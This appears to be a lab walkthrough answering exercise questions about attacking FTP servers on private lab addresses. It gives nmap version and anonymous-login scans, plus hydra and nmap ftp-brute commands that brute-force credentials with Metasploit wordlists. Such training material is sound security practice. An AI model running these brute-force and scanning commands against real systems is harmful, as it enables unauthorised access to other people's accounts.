# What is the version of FTP server?
Tells us the version of ftp like proftp, vsftpd..etc..
`nmap 192.60.4.3 -sV -p 21`

# Use the username dictionary /usr/share/metasploit-framework/data/wordlists/common_users.txt and password dictionary /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt to check if any of these credentials work on the system. List all found credentials.
Bruteforcing username and password using hydra

`hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.60.4.3 ftp`

# Find the password of user “sysadmin” using nmap script.
Finding pass using nmap ftp-brute
`nmap 192.60.4.3 --script ftp-brute --script-args userdb=/users -p 21`

# Find seven flags hidden on the server.
We can use all seven user one at atime to authenticate ftp and get flag, one example given in FTP_basic.md

# Find the version of vsftpd server.
`nmap 192.176.71.3 -p 21 -sV`

# Check whether anonymous login is allowed on the ftp server using nmap script.
Tells us if anaonymous login is allowed
`nmap 192.176.71.3 -p 21 --script ftp-anon`

# Fetch the flag from FTP server.
login FTP server with anonymous user and get flag